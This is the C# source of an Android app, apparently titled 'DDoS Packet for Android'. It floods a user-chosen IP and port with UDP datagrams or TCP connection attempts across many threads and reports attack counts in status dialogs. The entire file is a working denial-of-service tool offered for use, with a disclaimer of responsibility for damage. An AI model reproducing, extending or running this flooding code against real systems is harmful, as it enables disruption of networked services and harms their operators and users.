using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Xamarin.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Android.App;

namespace DDoSPacket
{
    public partial class MainPage : ContentPage
    {
        public int amountint = 0;
        public int amountfint = 0;
        public MainPage()
        {
            InitializeComponent();
            NP.Items.Add("UDP");
            NP.Items.Add("TCP");
        }


        void start(object sender, EventArgs args)
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
    ProtocolType.Udp);
            IPAddress serverAddr = IPAddress.Parse(ip.Text);
            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(port.Text));
            string text = "AAAAAAAAAAAABBBBBBBBBBBBCCCCCCCCCCCCDDDDDDDD";
            byte[] send_buffer = Encoding.ASCII.GetBytes(text);
            void udpattack()
            {
                new Thread(() =>
                {
                    try
                    {
                        sock.SendTo(send_buffer, endPoint);
                        amountint = amountint + 1;
                    }
                    catch
                    {
                        amountfint = amountfint + 1;
                    }
                }).Start();
            }
            void tcpattack()
            {
                    using (TcpClient tcpClient = new TcpClient())
                {
                    try
                    {
                        tcpClient.Connect(System.Net.IPAddress.Parse(ip.Text), int.Parse(port.Text));
                        amountint = amountint + 1;
                    }
                    catch (Exception)
                    {
                      amountfint = amountfint + 1;
                    }
                }
            }


            if (ip.Text == null)
            {
                DisplayAlert("Failed to Attack", "IP Box is null!", "OK");
                return;
            }
            else if (port.Text == null)
            {
                DisplayAlert("Failed to Attack", "Port Box is null!", "OK");
                return;
            }
            if (thread.Text == null)
            {
                DisplayAlert("Failed to Attack", "Thread Box is null!", "OK");
                return;
            }
            if (NP.SelectedItem == null)
            {
                DisplayAlert("Failed to Attack", "Network Protocol is null!", "OK");
                return;
            }
            if (NP.SelectedItem == "UDP")
            {
                DisplayAlert("Attack Status", "Started Attacking.\nType: UDP", "OK");
                new Thread(() =>
                {
                    for (int i = 0; i < int.Parse(thread.Text); i++)
                {
                    udpattack();
                }
                }).Start();
            }
            else
            {
                DisplayAlert("Attack Status", "Started Attacking.\nType: TCP", "OK");
                new Thread(() =>
                {
                        for (int i = 0; i < int.Parse(thread.Text); i++)
                    {
                        tcpattack();
                    }
                }).Start();
                
            }
    }
        void stop(object sender, EventArgs args)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        void status(object sender, EventArgs args)
        {
            int checkdone = amountint + amountfint;
            if (checkdone == int.Parse(thread.Text))
            {
                DisplayAlert("Attack Status", "Attack success\nAmount: " + amountint + "\nFailed: " + amountfint + "\nType: " + NP.SelectedItem, "OK");
                amountfint = 0;
                amountint = 0;
            }
            else if (checkdone >= int.Parse(thread.Text))
            {
                DisplayAlert("Attack Status", "Lamo you double click? Reset amount to 0.", "OK");
                amountfint = 0;
                amountint = 0;
            }
            else
            {
                DisplayAlert("Attack Status", "Attack Process\nAmount: " + amountint + "\nFailed: " + amountfint + "\nType: " + NP.SelectedItem, "OK");
            }
            
        }
        void INFO(object sender, EventArgs args)
        {
            DisplayAlert("Welcome", "Welcome to DDoS Packet for Android!\nVersion: 0.5.0 Beta\nDeveloper: fusedevgithub\nWarning: We are not responsible for any damage caused by this application \nNotice: This version maybe have less methods and many bugs.\nPlease Report if you found!", "OK");
        }
    }
}
